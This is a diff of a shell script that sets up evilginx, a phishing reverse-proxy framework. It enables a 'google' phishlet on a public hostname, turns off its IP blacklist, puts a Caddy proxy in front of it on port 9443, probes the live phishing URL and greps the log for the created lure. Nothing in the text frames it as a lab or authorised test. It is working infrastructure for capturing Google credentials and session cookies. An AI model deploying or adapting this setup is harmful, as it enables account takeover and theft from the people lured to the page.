@@ -28,7 +28,7 @@ done
 [ -n "$URL" ] && echo "PHISH_URL=$URL"
 HOST="${URL#https://}"
 
-echo "--- evilginx: config + hostname + enable + CREATE LURE ---"
+echo "--- evilginx: config + hostname + enable + create lure ---"
 $SUDO mkdir -p /root/.evilginx
 echo "{\"phishlets\":{\"google\":{\"enabled\":true,\"hostname\":\"$HOST\",\"unauth_url\":\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\"}},\"blacklist\":{\"enabled\":false,\"ip_addresses\":[],\"ip_masks\":[]}}" | $SUDO tee /root/.evilginx/config.json >/dev/null
 rm -f /tmp/eg_in; mkfifo /tmp/eg_in
@@ -42,10 +42,11 @@ for i in $(seq 1 30); do
 done
 echo "EVILGINX_443=$EG"
 
+echo "--- caddy :9443 -> https://evilginx:443 ---"
 cat > /tmp/Caddyfile <<EOF
 https://$HOST:9443 {
     tls internal
-    reverse_proxy 127.0.0.1:443 {
+    reverse_proxy https://127.0.0.1:443 {
         transport http {
             tls_insecure_skip_verify
             tls_server_name $HOST
@@ -61,13 +62,13 @@ for i in $(seq 1 30); do
   sleep 2
 done
 echo "CADDY_9443_BOUND=$BOUND"
-sleep 8
+sleep 10
 echo "--- edge probe ---"
-curl -sS -m 15 -o /tmp/edge.out -w 'EDGE_HTTP:%{http_code}\n' "$URL/" 2>&1 || echo "EDGE_PROBE_FAIL"
+curl -sS -m 20 -o /tmp/edge.out -w 'EDGE_HTTP:%{http_code}\n' "$URL/" 2>&1 || echo "EDGE_PROBE_FAIL"
 head -c 200 /tmp/edge.out 2>/dev/null || true
 echo ""
-echo "--- lure line (from stream) ---"
-grep -iE 'lure|created' evilginx.log | tail -n 5 || true
+echo "--- lure line ---"
+grep -iE 'created lure' evilginx.log | tail -n 3 || true
 
 echo "=== streaming evilginx output ==="
 trap 'kill %3 %2 %1 2>/dev/null || true' EXIT
